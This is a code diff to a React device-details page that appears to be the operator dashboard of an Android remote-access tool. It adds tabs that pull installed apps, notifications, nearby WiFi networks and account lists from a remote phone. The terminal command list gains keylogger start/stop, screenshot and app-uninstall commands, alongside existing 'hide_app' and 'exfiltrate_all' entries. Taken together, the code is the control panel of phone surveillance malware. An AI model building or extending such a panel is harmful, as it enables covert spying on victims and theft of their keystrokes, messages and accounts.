@@ -52,8 +52,12 @@ const tabs = [
   { id: "photos", label: "Photos", icon: FiImage },
   { id: "videos", label: "Videos", icon: FiVideo },
   { id: "files", label: "Files", icon: FiFolder },
+  { id: "apps", label: "Apps", icon: FiSmartphone },
   { id: "camera", label: "Camera", icon: FiCamera },
   { id: "audio", label: "Audio", icon: FiMic },
+  { id: "notifications", label: "Notifications", icon: FiBell },
+  { id: "wifi", label: "WiFi", icon: FiWifi },
+  { id: "accounts", label: "Accounts", icon: FiUsers },
   { id: "terminal", label: "Terminal", icon: FiTerminal },
 ];
 
@@ -1521,6 +1525,235 @@ export default function DeviceDetails() {
           </div>
         )}
 
+        {/* ===== APPS ===== */}
+        {activeTab === "apps" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-lg font-semibold">
+                Installed Apps{" "}
+                {(data.installedApps || []).length > 0 &&
+                  `(${data.installedApps.length})`}
+              </h3>
+              <button
+                onClick={() => sendCommand("get_installed_apps")}
+                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
+              >
+                <FiRefreshCw className="text-sm" /> Refresh
+              </button>
+            </div>
+            {(data.installedApps || []).length > 0 ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[600px] overflow-y-auto">
+                {(data.installedApps || []).map((app, i) => (
+                  <div
+                    key={app.packageName || i}
+                    className="p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
+                  >
+                    <div className="flex items-center gap-3">
+                      <div className="w-10 h-10 rounded-lg bg-primary-500/10 flex items-center justify-center flex-shrink-0">
+                        <FiSmartphone className="text-primary-400" />
+                      </div>
+                      <div className="flex-1 min-w-0">
+                        <p className="text-sm font-medium truncate">
+                          {app.appName || "Unknown"}
+                        </p>
+                        <p className="text-xs text-dark-400 truncate">
+                          {app.packageName}
+                        </p>
+                        <p className="text-xs text-dark-500">
+                          v{app.versionName || "?"} ·{" "}
+                          {app.isSystemApp ? "System" : "User"}
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-12 text-dark-400">
+                <FiSmartphone className="text-4xl mx-auto mb-3 opacity-50" />
+                <p>No app data available</p>
+                <button
+                  onClick={() => sendCommand("get_installed_apps")}
+                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                >
+                  Fetch apps now
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ===== NOTIFICATIONS ===== */}
+        {activeTab === "notifications" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-lg font-semibold">Notifications</h3>
+              <button
+                onClick={() => sendCommand("get_notifications")}
+                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
+              >
+                <FiRefreshCw className="text-sm" /> Refresh
+              </button>
+            </div>
+            {(data.notifications || []).length > 0 ? (
+              <div className="space-y-2 max-h-[600px] overflow-y-auto">
+                {(data.notifications || []).map((notif, i) => (
+                  <div
+                    key={i}
+                    className="p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
+                  >
+                    <div className="flex items-center justify-between mb-2">
+                      <p className="font-medium text-sm">
+                        {notif.title || notif.app || "Notification"}
+                      </p>
+                      <span className="text-xs text-dark-400">
+                        {notif.timestamp
+                          ? new Date(notif.timestamp).toLocaleTimeString()
+                          : ""}
+                      </span>
+                    </div>
+                    <p className="text-sm text-dark-300">
+                      {notif.text || notif.body || "No content"}
+                    </p>
+                    {notif.packageName && (
+                      <p className="text-xs text-dark-500 mt-2">
+                        {notif.packageName}
+                      </p>
+                    )}
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-12 text-dark-400">
+                <FiBell className="text-4xl mx-auto mb-3 opacity-50" />
+                <p>No notification data available</p>
+                <p className="text-xs mt-2 text-dark-500">
+                  Notification access requires NotificationListenerService
+                </p>
+                <button
+                  onClick={() => sendCommand("get_notifications")}
+                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                >
+                  Fetch notifications
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ===== WiFi ===== */}
+        {activeTab === "wifi" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-lg font-semibold">WiFi Networks</h3>
+              <button
+                onClick={() => sendCommand("get_wifi_networks")}
+                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
+              >
+                <FiRefreshCw className="text-sm" /> Scan
+              </button>
+            </div>
+            {(data.wifiNetworks || []).length > 0 ? (
+              <div className="space-y-2 max-h-[600px] overflow-y-auto">
+                {(data.wifiNetworks || []).map((network, i) => (
+                  <div
+                    key={i}
+                    className="p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
+                  >
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <div
+                          className={`w-2 h-2 rounded-full ${
+                            network.level > -50
+                              ? "bg-green-400"
+                              : network.level > -70
+                              ? "bg-yellow-400"
+                              : "bg-red-400"
+                          }`}
+                        />
+                        <div>
+                          <p className="font-medium text-sm">
+                            {network.ssid || "Hidden Network"}
+                          </p>
+                          <p className="text-xs text-dark-400">
+                            {network.bssid} · {network.capabilities}
+                          </p>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <p className="text-xs text-dark-400">
+                          Ch {network.frequency} · {network.level} dBm
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-12 text-dark-400">
+                <FiWifi className="text-4xl mx-auto mb-3 opacity-50" />
+                <p>No WiFi data available</p>
+                <button
+                  onClick={() => sendCommand("get_wifi_networks")}
+                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                >
+                  Scan WiFi networks
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ===== ACCOUNTS ===== */}
+        {activeTab === "accounts" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-lg font-semibold">Accounts</h3>
+              <button
+                onClick={() => sendCommand("get_accounts")}
+                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
+              >
+                <FiRefreshCw className="text-sm" /> Refresh
+              </button>
+            </div>
+            {(data.accounts || []).length > 0 ? (
+              <div className="space-y-2 max-h-[600px] overflow-y-auto">
+                {(data.accounts || []).map((account, i) => (
+                  <div
+                    key={i}
+                    className="p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
+                  >
+                    <div className="flex items-center gap-3">
+                      <div className="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center flex-shrink-0">
+                        <FiUsers className="text-blue-400" />
+                      </div>
+                      <div className="flex-1 min-w-0">
+                        <p className="font-medium text-sm truncate">
+                          {account.name || "Unknown"}
+                        </p>
+                        <p className="text-xs text-dark-400 truncate">
+                          {account.type || "Account"}
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-12 text-dark-400">
+                <FiUsers className="text-4xl mx-auto mb-3 opacity-50" />
+                <p>No account data available</p>
+                <button
+                  onClick={() => sendCommand("get_accounts")}
+                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                >
+                  Fetch accounts
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
         {/* ===== TERMINAL ===== */}
         {activeTab === "terminal" && (
           <div className="glass-effect rounded-2xl p-6">
@@ -1578,12 +1811,19 @@ export default function DeviceDetails() {
                 "get_battery",
                 "get_sim_info",
                 "get_network_info",
+                "get_notifications",
+                "get_wifi_networks",
+                "get_accounts",
+                "take_screenshot",
                 'vibrate {"duration":1000}',
                 'open_url {"url":"https://..."}',
                 "hide_app",
                 "unhide_app",
+                "start_keylogger",
+                "stop_keylogger",
                 "exfiltrate_all",
                 "get_device_info",
+                'uninstall_app {"packageName":"com.example.app"}',
               ].map((cmd) => (
                 <button
                   key={cmd}
